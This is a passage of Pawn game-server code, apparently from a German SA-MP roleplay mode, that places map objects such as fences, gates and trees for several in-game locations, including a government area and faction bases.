CreateDynamicObject(1440, 1341.38281, -1761.32996, 13.00300,   0.00000, 0.00000, 266.36011);
CreateDynamicObject(3092, 1338.71631, -1776.90491, 12.73080,   91.00000, 0.00000, 0.00000);
CreateDynamicObject(3119, 1339.17249, -1777.51001, 12.71137,   0.00000, 0.00000, 102.22612);
CreateDynamicObject(19589, 1341.77405, -1779.06299, 12.46700,   0.00000, 0.00000, 87.78544);
CreateDynamicObject(2905, 1341.99756, -1779.23096, 12.65270,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(2906, 1342.54321, -1779.17932, 12.63320,   0.00000, 0.00000, 29.08660);
CreateDynamicObject(2907, 1341.29932, -1779.56274, 12.68490,   0.00000, 0.00000, 333.17856);
CreateDynamicObject(2908, 1341.12610, -1778.20349, 12.63310,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(2677, 1370.25159, -1771.92078, 12.87411,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(2677, 1342.45276, -1773.08435, 12.87411,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(2677, 1340.90161, -1792.61853, 12.87411,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(2908, 1342.44397, -1779.59131, 12.81311,   0.00000, 0.00000, 94.67532);
CreateDynamicObject(2905, 1341.15808, -1778.77869, 12.65270,   0.00000, 0.00000, 315.17798);
CreateDynamicObject(2907, 1342.07813, -1778.42419, 12.68490,   0.00000, 0.00000, 252.11485);
CreateDynamicObject(2906, 1341.72437, -1779.12866, 12.63320,   0.00000, 0.00000, 29.08660);
CreateDynamicObject(2953, 1339.06360, -1776.04529, 12.54382,   0.00000, 0.00000, 104.78487);
CreateDynamicObject(2953, 1340.36487, -1773.42896, 12.54382,   0.00000, 0.00000, 77.96349);
CreateDynamicObject(2953, 1339.37378, -1763.84106, 12.54382,   0.00000, 0.00000, 24.94698);
CreateDynamicObject(1332, 1337.52502, -1743.78247, 13.56280,   0.00000, 0.00000, 87.59470);
CreateDynamicObject(1335, 1337.57410, -1746.13147, 13.61798,   0.00000, 0.00000, 90.75982);
CreateDynamicObject(1345, 1337.63770, -1748.63098, 13.28530,   0.00000, 0.00000, 272.72900);
CreateDynamicObject(1235, 1350.76843, -1759.07739, 13.01970,   0.00000, 0.00000, 0.00000);
//CreateDynamicObject(1359, 1465.14319, -1741.52966, 13.21430,   0.00000, 0.00000, 0.00000);
//CreateDynamicObject(1359, 1431.34570, -1741.42432, 13.21430,   0.00000, 0.00000, 0.00000);
//CreateDynamicObject(1359, 1420.93286, -1698.99768, 13.21430,   0.00000, 0.00000, 0.00000);
//CreateDynamicObject(1359, 1422.65588, -1608.79480, 13.21430,   0.00000, 0.00000, 0.00000);
//CreateDynamicObject(1359, 1461.70813, -1599.25854, 13.21430,   0.00000, 0.00000, 0.00000);
//CreateDynamicObject(1359, 1494.81995, -1586.18469, 13.21430,   0.00000, 0.00000, 0.00000);
//CreateDynamicObject(1359, 1536.98682, -1602.04529, 13.21430,   0.00000, 0.00000, 0.00000);
//CreateDynamicObject(1359, 1522.99402, -1645.16724, 13.21430,   0.00000, 0.00000, 0.00000);
//CreateDynamicObject(1359, 1543.16382, -1670.47327, 13.21430,   0.00000, 0.00000, 0.00000);
//CreateDynamicObject(1359, 1521.88428, -1716.03491, 13.21430,   0.00000, 0.00000, 0.00000);
//CreateDynamicObject(1359, 1561.32031, -1755.59033, 13.21430,   0.00000, 0.00000, 0.00000);
//CreateDynamicObject(1359, 1596.58276, -1724.51587, 13.21430,   0.00000, 0.00000, 0.00000);
//CreateDynamicObject(1359, 1668.27722, -1739.79041, 13.21430,   0.00000, 0.00000, 0.00000);
//CreateDynamicObject(1359, 1677.24463, -1724.51880, 13.21430,   0.00000, 0.00000, 0.00000);
//CreateDynamicObject(1359, 1705.71912, -1724.69836, 13.21430,   0.00000, 0.00000, 0.00000);
//CreateDynamicObject(1359, 1745.02319, -1738.93127, 13.21430,   0.00000, 0.00000, 0.00000);
//CreateDynamicObject(1359, 1813.58435, -1724.43604, 13.21430,   0.00000, 0.00000, 0.00000);
//CreateDynamicObject(1359, 1828.16846, -1703.17896, 13.21430,   0.00000, 0.00000, 0.00000);
//CreateDynamicObject(1359, 1829.70227, -1743.95081, 13.21430,   0.00000, 0.00000, 0.00000);
//CreateDynamicObject(1359, 1929.11230, -1745.59583, 13.21430,   0.00000, 0.00000, 0.00000);
//CreateDynamicObject(1359, 1963.25488, -1745.84302, 13.21430,   0.00000, 0.00000, 0.00000);
//CreateDynamicObject(1359, 1971.55713, -1759.71045, 13.21430,   0.00000, 0.00000, 0.00000);
//CreateDynamicObject(1359, 1931.98816, -1760.77295, 13.21430,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1332, 1504.99658, -1751.61902, 13.55320,   0.00000, 0.00000, 88.60890);
CreateDynamicObject(1332, 1456.12866, -1754.36304, 13.55320,   0.00000, 0.00000, 178.09814);
CreateDynamicObject(1344, 1453.17786, -1754.43335, 13.32240,   0.00000, 0.00000, 182.53780);
CreateDynamicObject(1344, 1507.41809, -1754.77734, 13.32240,   0.00000, 0.00000, 182.53780);
CreateDynamicObject(1220, 1505.07202, -1753.44006, 12.87140,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1220, 1505.97925, -1754.05261, 12.87140,   0.00000, 0.00000, 346.93268);
CreateDynamicObject(1220, 1504.86523, -1753.39954, 13.54660,   0.00000, 0.00000, 275.31009);
CreateDynamicObject(1328, 1504.64124, -1754.36438, 13.00828,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1328, 1504.70313, -1755.28235, 13.00828,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1328, 1505.62146, -1755.22021, 13.00828,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1597, 1500.32544, -1732.54626, 14.84450,   0.00000, 0.00000, 91.10090);
CreateDynamicObject(1597, 1490.46729, -1732.63196, 14.84450,   0.00000, 0.00000, 90.07970);
CreateDynamicObject(1597, 1480.60425, -1732.52771, 14.84450,   0.00000, 0.00000, 90.07970);
CreateDynamicObject(1597, 1470.72241, -1732.54346, 14.84450,   0.00000, 0.00000, 90.07970);
CreateDynamicObject(1597, 1460.89343, -1732.55933, 14.84450,   0.00000, 0.00000, 90.07970);
CreateDynamicObject(15038, 1467.13770, -1749.62231, 15.05270,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(15038, 1495.25977, -1749.74963, 15.05270,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(2241, 1484.67676, -1771.94751, 18.20065,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(2241, 1477.34631, -1771.84705, 18.20065,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(638, 1465.06824, -1749.73511, 15.12940,   0.00000, 0.00000, 89.51840);
CreateDynamicObject(638, 1497.41223, -1749.73706, 15.12940,   0.00000, 0.00000, 89.51840);
//CreateDynamicObject(1359, 1502.72302, -1741.20593, 13.21430,   0.00000, 0.00000, 0.00000);
//CreateDynamicObject(1359, 1468.10352, -1764.42615, 18.40230,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1368, 1468.22961, -1766.68359, 18.45734,   0.00000, 0.00000, 90.22373);
CreateDynamicObject(1368, 1468.26819, -1769.51233, 18.45734,   0.00000, 0.00000, 90.22373);
CreateDynamicObject(1951, 1468.36719, -1770.57776, 18.55060,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1951, 1468.26685, -1764.44421, 18.04456,   0.00000, 0.00000, 3.08209);
CreateDynamicObject(2647, 1468.19263, -1765.52795, 18.49940,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(2647, 1468.02063, -1767.90918, 17.88627,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(2647, 1467.93665, -1764.41260, 17.98930,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1951, 1468.24158, -1764.61462, 18.04456,   0.00000, 0.00000, 3.08209);
CreateDynamicObject(1951, 1468.08484, -1764.57544, 18.04456,   0.00000, 0.00000, 3.08209);
CreateDynamicObject(1951, 1468.26758, -1764.27380, 18.04456,   0.00000, 0.00000, 3.08209);
CreateDynamicObject(2647, 1468.09436, -1764.25916, 17.98930,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(2856, 1468.34851, -1767.70203, 18.37880,   0.00000, 0.00000, 20.26530);
CreateDynamicObject(3065, 1471.07263, -1768.83813, 17.85240,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(18728, 2199.82324, -1188.30090, 33.02347,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(18728, 2199.75293, -1188.46558, 33.82500,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1346, 1481.01270, -1703.99890, 14.27137,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1346, 1479.10535, -1704.03406, 14.27137,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1216, 1494.50903, -1766.42566, 18.34980,   0.00000, 0.00000, 270.44360);
CreateDynamicObject(1216, 1494.51770, -1765.54883, 18.34980,   0.00000, 0.00000, 270.44360);
CreateDynamicObject(1216, 1494.50903, -1767.26575, 18.34980,   0.00000, 0.00000, 270.44360);
CreateDynamicObject(970, 1505.87073, -1737.39722, 13.07670,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(970, 1501.61267, -1737.39819, 13.07670,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(970, 1497.39075, -1737.39722, 13.07670,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(970, 1493.15112, -1737.40234, 13.07670,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(970, 1488.90735, -1737.40125, 13.07670,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(970, 1480.34595, -1737.41650, 13.07670,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(970, 1476.12585, -1737.41650, 13.07670,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(970, 1471.88586, -1737.41650, 13.07670,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(970, 1467.66589, -1737.41650, 13.07670,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(970, 1463.42590, -1737.41650, 13.07670,   0.00000, 0.00000, 0.00000);
//CreateDynamicObject(1361, 1489.35925, -1750.22888, 15.04960,   0.00000, 0.00000, 0.00000);
//CreateDynamicObject(1361, 1483.83496, -1750.24597, 15.04960,   0.00000, 0.00000, 0.00000);
//CreateDynamicObject(1361, 1478.43359, -1750.25464, 15.04960,   0.00000, 0.00000, 0.00000);
//CreateDynamicObject(1361, 1472.99060, -1750.24988, 15.04960,   0.00000, 0.00000, 0.00000);


// Maps von YG.
CreateDynamicObject(19978, 1433.69263, -1028.58826, 22.69610,   0.00000, 0.00000, 91.03970);
CreateDynamicObject(19978, 1433.60352, -1028.57593, 22.69610,   0.00000, 0.00000, 272.31369);
CreateDynamicObject(19978, 1468.25330, -1039.29956, 22.69610,   0.00000, 0.00000, 272.31372);
CreateDynamicObject(19978, 1468.35681, -1039.28894, 22.69610,   0.00000, 0.00000, 91.03970);
CreateDynamicObject(19952, 1628.39697, -864.42499, 56.06060,   0.00000, 0.00000, 172.74319);
CreateDynamicObject(19952, 1623.88916, -869.67987, 55.60060,   0.00000, 0.00000, 172.74319);
CreateDynamicObject(19952, 1619.38867, -874.90228, 54.98060,   0.00000, 0.00000, 172.74319);
CreateDynamicObject(19952, 1614.37976, -879.78693, 54.00550,   0.00000, 0.00000, 172.74319);
CreateDynamicObject(19951, 1631.55811, -863.31995, 56.24742,   0.00000, 0.00000, 138.90808);
CreateDynamicObject(19951, 1631.05298, -871.56122, 54.31003,   0.00000, 0.00000, 138.90808);
CreateDynamicObject(19951, 1630.56226, -879.60742, 52.16139,   0.00000, 0.00000, 138.90808);
CreateDynamicObject(19951, 1630.62097, -887.61267, 50.02430,   0.00000, 0.00000, 138.90810);
CreateDynamicObject(19951, 1631.71753, -895.40686, 48.18785,   0.00000, 0.00000, 138.90810);
CreateDynamicObject(19951, 1632.74963, -903.26093, 46.05560,   0.00000, 0.00000, 138.90810);
CreateDynamicObject(18660, 1631.24780, -902.62360, 48.45577,   0.00000, 0.00000, 188.09816);
CreateDynamicObject(18667, 1629.88953, -892.10626, 50.87880,   0.00000, 0.00000, 188.77751);
CreateDynamicObject(1531, 1629.26282, -887.22168, 51.98830,   0.00000, 0.00000, 189.89320);
CreateDynamicObject(18667, 1628.97717, -885.16718, 52.43110,   0.00000, 0.00000, 187.54289);
CreateDynamicObject(18660, 1630.17700, -894.16083, 50.34770,   0.00000, 0.00000, 188.09821);
CreateDynamicObject(18667, 1643.01611, -891.04297, 50.83580,   0.00000, 0.00000, 7.48730);
CreateDynamicObject(19952, 1609.42883, -884.71570, 52.87405,   0.00000, 0.00000, 172.74319);
CreateDynamicObject(19952, 1604.26245, -889.38867, 51.86200,   0.00000, 0.00000, 172.74319);
CreateDynamicObject(19952, 1598.84131, -894.00739, 50.62180,   0.00000, 0.00000, 172.74319);
CreateDynamicObject(18667, 1654.29517, -896.77618, 59.35230,   0.00000, 0.00000, 352.48230);
CreateDynamicObject(18660, 1643.67126, -896.25464, 50.34770,   0.00000, 0.00000, 6.71007);
CreateDynamicObject(19962, 1409.05798, -1028.87292, 22.55115,   0.00000, 0.00000, 89.59497);
CreateDynamicObject(19962, 1463.37378, -937.40387, 34.60611,   0.00000, 0.00000, 89.59497);
CreateDynamicObject(19962, 1467.77112, -948.64862, 34.91526,   0.00000, 0.00000, 76.06410);
CreateDynamicObject(647, 1614.91785, -855.45374, 57.89218,   356.85840, 0.00000, 3.14159);
CreateDynamicObject(647, 1585.61255, -880.28131, 52.98574,   356.85840, 0.00000, 3.14159);
CreateDynamicObject(1597, 1463.46387, -1034.06445, 25.09340,   0.00000, 0.00000, 90.01670);
CreateDynamicObject(1597, 1455.09888, -1034.05359, 25.09340,   0.00000, 0.00000, 90.01670);
CreateDynamicObject(1597, 1446.76526, -1033.93738, 25.09340,   0.00000, 0.00000, 90.01670);
CreateDynamicObject(1364, 1544.36768, -1038.01819, 23.56702,   0.00000, 0.00000, 317.65424);
CreateDynamicObject(1360, 1538.45740, -1034.74121, 23.56872,   0.00000, 0.00000, 64.65081);
CreateDynamicObject(1360, 1535.77917, -1033.50378, 23.56872,   0.00000, 0.00000, 64.65081);
CreateDynamicObject(1360, 1541.23413, -1036.00879, 23.56872,   0.00000, 0.00000, 60.12500);
CreateDynamicObject(1360, 1546.98230, -1040.57764, 23.56872,   0.00000, 0.00000, 49.58935);
CreateDynamicObject(1360, 1549.10950, -1042.49548, 23.56872,   0.00000, 0.00000, 49.58935);
CreateDynamicObject(1364, 1551.97961, -1044.68506, 23.56702,   0.00000, 0.00000, 319.20633);
CreateDynamicObject(1360, 1554.60669, -1047.21045, 23.56872,   0.00000, 0.00000, 49.58935);
CreateDynamicObject(869, 1546.46008, -1035.75183, 23.49217,   0.00000, 0.00000, 347.83276);
CreateDynamicObject(869, 1553.06958, -1040.97949, 23.49217,   0.00000, 0.00000, 36.60946);
CreateDynamicObject(869, 1556.72534, -1044.33447, 23.49217,   0.00000, 0.00000, 347.83276);
CreateDynamicObject(870, 1558.67322, -1048.27502, 23.26647,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(870, 1575.24622, -1068.73206, 23.37053,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(870, 1585.21594, -1088.97144, 23.47356,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(870, 1583.06104, -1088.14209, 23.37053,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(870, 1585.40637, -1086.23145, 23.47356,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(870, 1587.71326, -1087.47412, 23.47356,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(870, 1587.31750, -1090.67554, 23.47356,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(870, 1587.96265, -1084.53394, 23.47356,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(870, 1585.90259, -1083.17700, 23.37053,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(870, 1583.14526, -1085.02136, 23.37053,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(870, 1581.04773, -1076.23584, 23.47356,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(870, 1571.38965, -1056.67297, 23.47254,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(870, 1538.01208, -1032.21118, 23.26852,   0.00000, 0.00000, 78.38548);
CreateDynamicObject(870, 1540.16577, -1033.20605, 23.26852,   0.00000, 0.00000, 78.38548);
CreateDynamicObject(870, 1542.92578, -1034.26807, 23.37053,   0.00000, 0.00000, 87.67009);
CreateDynamicObject(870, 1547.44275, -1037.43054, 23.47356,   0.00000, 0.00000, 87.67009);
CreateDynamicObject(870, 1549.55640, -1040.10840, 23.77657,   0.00000, 0.00000, 87.67009);
CreateDynamicObject(870, 1557.60437, -1040.91113, 23.57659,   0.00000, 0.00000, 87.67009);
CreateDynamicObject(869, 1559.98401, -1047.07422, 23.49217,   0.00000, 0.00000, 90.89259);
CreateDynamicObject(869, 1571.05554, -1060.09131, 23.49217,   0.00000, 0.00000, 90.89259);
CreateDynamicObject(729, 1562.05420, -1045.36633, 23.17969,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(729, 1568.73767, -1059.30469, 23.17969,   0.00000, 0.00000, 21.09114);
CreateDynamicObject(729, 1578.14343, -1072.03467, 23.17969,   0.00000, 0.00000, 21.09114);
CreateDynamicObject(729, 1586.08228, -1099.41675, 23.17969,   0.00000, 0.00000, 33.92998);
CreateDynamicObject(729, 1586.08228, -1099.41675, 23.17969,   0.00000, 0.00000, 33.92998);
CreateDynamicObject(700, 1570.39844, -1052.90393, 23.33030,   356.85840, 0.00000, -2.00713);
CreateDynamicObject(700, 1584.14197, -1073.21606, 23.33030,   356.85840, 0.00000, -2.00713);
CreateDynamicObject(700, 1584.16138, -1073.21118, 23.33030,   356.85840, 0.00000, -2.00713);
CreateDynamicObject(700, 1591.19910, -1087.02393, 23.33030,   356.85840, 0.00000, -2.00713);
CreateDynamicObject(700, 1591.19910, -1087.02393, 23.33030,   356.85840, 0.00000, -2.00713);
CreateDynamicObject(19425, 1467.44568, -1036.54211, 22.70310,   0.00000, 0.00000, 91.19167);
CreateDynamicObject(19425, 1467.32678, -1031.09680, 22.70310,   0.00000, 0.00000, 91.19167);
CreateDynamicObject(19425, 1443.36560, -1031.18933, 22.70310,   0.00000, 0.00000, 90.06429);
CreateDynamicObject(19425, 1443.36792, -1036.42932, 22.70310,   0.00000, 0.00000, 90.06638);
CreateDynamicObject(1211, 1471.93140, -1043.95679, 23.40610,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1211, 1427.04370, -1028.57410, 23.38610,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1211, 1378.41492, -1041.86011, 26.18810,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1214, 1487.00342, -1028.59497, 22.56355,   0.00000, 0.00000, 151.86224);
CreateDynamicObject(1214, 1469.00464, -1028.62646, 22.56355,   0.00000, 0.00000, 151.86224);
CreateDynamicObject(1214, 1483.14929, -1028.68677, 22.56355,   0.00000, 0.00000, 151.86224);
CreateDynamicObject(1215, 1488.99597, -1028.58875, 23.30960,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1215, 1481.35266, -1028.69580, 23.30960,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1215, 1476.13147, -1028.69934, 23.30960,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1214, 1479.74780, -1028.63989, 22.56355,   0.00000, 0.00000, 151.86224);
CreateDynamicObject(1214, 1478.04810, -1028.64746, 22.56355,   0.00000, 0.00000, 151.86224);
CreateDynamicObject(1214, 1474.47961, -1028.63794, 22.56355,   0.00000, 0.00000, 151.86224);
CreateDynamicObject(1214, 1472.81897, -1028.64526, 22.56355,   0.00000, 0.00000, 151.86224);
CreateDynamicObject(1214, 1472.81897, -1028.64526, 22.56355,   0.00000, 0.00000, 151.86224);
CreateDynamicObject(1215, 1471.08936, -1028.73975, 23.30960,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1215, 1485.02429, -1028.70020, 23.30960,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(970, 1465.11975, -1028.61340, 23.35980,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(970, 1458.25867, -1028.59924, 23.35980,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(970, 1453.99719, -1028.59021, 23.35980,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(970, 1449.71716, -1028.59021, 23.35980,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1214, 1444.87366, -1028.61853, 22.56355,   0.00000, 0.00000, 151.86224);
CreateDynamicObject(1214, 1446.30896, -1028.61865, 22.56350,   0.00000, 0.00000, 151.86220);
CreateDynamicObject(1215, 1443.37952, -1028.70728, 23.30960,   0.00000, 0.00000, 0.00000);

//SetTimer("LetDoorsLocked", 1000, 1);
//----------------------------------------------------------------------------------------------------

// Regierung
//--------------------------------------------
/*
	CreateDynamicObject(3749, 1285.3000488281, -2056.3999023438, 63.599998474121, 0, 0, 90);
	CreateDynamicObject(982, 1283.5, -2033.5999755859, 58.599998474121, 0, 0, 0);
	CreateDynamicObject(982, 1268.9000244141, -2002.6999511719, 59, 2, 0, 90);
	CreateDynamicObject(982, 1243.3000488281, -2002.6999511719, 59.799999237061, 2, 0, 89.994995117188);
	CreateDynamicObject(984, 1283.6999511719, -2014.4000244141, 58.5, 0, 0, 0);
	CreateDynamicObject(984, 1276.9000244141, -2046.6999511719, 58.900001525879, 0, 0, 270);
	CreateDynamicObject(984, 1249.5, -2045.6999511719, 59.599998474121, 0, 0, 270);
	CreateDynamicObject(982, 1270.4000244141, -2065.6999511719, 59, 2, 0, 88);
	CreateDynamicObject(982, 1249.5999755859, -2065, 59.599998474121, 1.99951171875, 0, 87.994995117188);
*/
//--------------------------------------------

    //buycar
//	AddStaticPickup(1274,1,1023.1495,-1091.6942,23.8349);
//	Create3DTextLabel("| Fraktionsautohaus |\nBenutze: '/buycar'",COLOR_YELLOW,1023.1495,-1091.6942,23.8349,10.0,0);
//	AddStaticPickup(1239,1,-1837.4830,-14.3257,15.1172);
//	Create3DTextLabel("| Umspritzen |\nBenutze: '/afarbe'",COLOR_YELLOW,-1837.4830,-14.3257,15.1172,10.0,0);


// Russen Mafia Base
CreateDynamicObject(3749, 2605.91602, 2303.04395, 15.60522,   0.00000, 0.00000, 0.99976);
CreateDynamicObject(987, 2599.96777, 2302.99707, 10.01306,   0.00000, 0.00000, 179.99451);
CreateDynamicObject(2959, 2597.39673, 2300.79443, 9.82031,   0.00000, 0.00000, 270.74976);
CreateDynamicObject(749, 2600.86621, 2303.15332, 9.86877,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(749, 2611.27344, 2302.77197, 9.74203,   0.00000, 0.00000, 242.24487);
CreateDynamicObject(2959, 2614.62695, 2301.16333, 9.82031,   0.00000, 0.00000, 90.75000);
CreateDynamicObject(3475, 2615.43628, 2302.84277, 12.81683,   0.00000, 0.00000, 270.00000);
CreateDynamicObject(987, 2618.38843, 2291.17505, 10.93807,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(987, 2618.41846, 2279.22998, 10.93807,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(987, 2618.41748, 2267.24487, 10.93807,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(987, 2618.42529, 2255.29858, 10.93807,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(987, 2618.28369, 2243.37354, 10.93807,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(987, 2605.71533, 2243.43994, 10.93807,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(987, 2593.73975, 2243.45728, 10.93807,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(987, 2581.77051, 2243.46680, 10.93807,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(987, 2557.87354, 2279.39282, 10.93807,   0.00000, 0.00000, 270.00000);
CreateDynamicObject(987, 2557.90088, 2289.82227, 10.93807,   0.00000, 0.00000, 270.00000);
CreateDynamicObject(3109, 2570.60034, 2289.91260, 11.26157,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(3934, 2566.32495, 2295.97778, 16.82221,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(983, 2558.19556, 2293.07227, 19.31088,   0.00000, 0.00000, 180.00000);
CreateDynamicObject(983, 2558.21094, 2297.86597, 19.31088,   0.00000, 0.00000, 179.99451);
CreateDynamicObject(984, 2565.66528, 2289.86475, 17.45889,   0.00000, 0.00000, 270.00000);
CreateDynamicObject(983, 2570.43872, 2289.92847, 17.50576,   0.00000, 0.00000, 270.00000);
CreateDynamicObject(5152, 2563.03320, 2299.53662, 17.02039,   0.00000, 355.99548, 89.49463);
CreateDynamicObject(5152, 2563.05957, 2303.49414, 17.14539,   0.00000, 0.00000, 270.00000);
CreateDynamicObject(987, 2569.84521, 2243.48340, 10.93807,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(987, 2557.90649, 2243.49780, 10.93807,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(987, 2557.87769, 2267.45605, 10.93807,   0.00000, 0.00000, 270.00000);
CreateDynamicObject(987, 2557.88184, 2255.53223, 10.93807,   0.00000, 0.00000, 270.00000);


// BBH
CreateDynamicObject(6959, 1068.11768, -1682.36035, 12.56602,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(6959, 1109.45715, -1682.28833, 12.56601,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(6959, 1119.48157, -1682.26685, 12.31695,   0.00000, -1.68340, 0.00000);
CreateDynamicObject(18762, 1047.92932, -1662.75635, 13.39910,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(8674, 1047.47998, -1665.47998, 14.01000,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(8674, 1047.46997, -1675.77002, 14.01000,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(8674, 1047.47998, -1686.06006, 14.01000,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(8674, 1047.46997, -1696.34998, 14.01000,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(18762, 1047.74072, -1702.04443, 13.22390,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(8674, 1053.38000, -1702.26001, 14.01000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(8674, 1063.67004, -1702.27002, 14.01000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(8674, 1073.94995, -1702.26001, 14.01000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(18762, 1079.47461, -1701.89966, 13.37270,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(8674, 1079.48999, -1696.35999, 14.01000,   0.00000, 0.00000, 90.00000);
//CreateDynamicObject(1361, 1079.45996, -1690.62000, 13.25000,   0.00000, 0.00000, 17.82000);
CreateDynamicObject(8674, 1107.95996, -1696.35999, 14.01000,   0.00000, 0.00000, 90.00000);
//CreateDynamicObject(1361, 1107.93005, -1690.62000, 13.25000,   0.00000, 0.00000, 17.82000);
CreateDynamicObject(18762, 1108.05762, -1701.92261, 13.38620,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(8674, 1113.50000, -1702.27002, 14.01000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(8674, 1123.79004, -1702.26001, 14.01000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(8674, 1134.07996, -1702.18994, 14.01000,   0.00000, 0.00000, 0.66000);
CreateDynamicObject(18762, 1139.54993, -1701.73999, 13.72297,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(8674, 1139.96997, -1696.22998, 14.34000,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(8674, 1139.97998, -1685.93994, 14.34000,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(8674, 1139.96997, -1675.65002, 14.34000,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(8674, 1139.95996, -1665.35999, 14.34000,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(18762, 1139.48364, -1662.83215, 13.64870,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1597, 1138.09998, -1682.69995, 15.44000,   0.00000, -1.50000, 0.00000);
CreateDynamicObject(19121, 1138.31006, -1678.38000, 13.56000,   0.00000, -1.50000, 0.00000);
CreateDynamicObject(19121, 1138.32996, -1687.21997, 13.56000,   0.00000, -1.50000, 0.00000);
CreateDynamicObject(1290, 1111.82996, -1695.78003, 18.56000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1360, 1111.81006, -1693.91003, 13.25000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1360, 1111.81006, -1697.65002, 13.25000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1360, 1075.65002, -1693.91003, 13.25000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1360, 1075.65002, -1697.65002, 13.25000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1290, 1075.60999, -1695.78003, 18.56000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1597, 1049.00000, -1682.69995, 15.15000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(19121, 1049.16003, -1678.42004, 13.26000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(19121, 1049.17004, -1687.23999, 13.26000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3881, 1093.95996, -1696.56995, 14.39000,   0.00000, 0.00000, -180.00000);
CreateDynamicObject(640, 1092.83997, -1702.01001, 13.23000,   0.00000, 0.00000, -89.90000);
CreateDynamicObject(638, 1095.93994, -1701.98999, 13.24000,   0.00000, 0.00000, -89.90000);
CreateDynamicObject(19121, 1096.93005, -1702.00000, 13.50000,   0.00000, 0.00000, 0.00000);
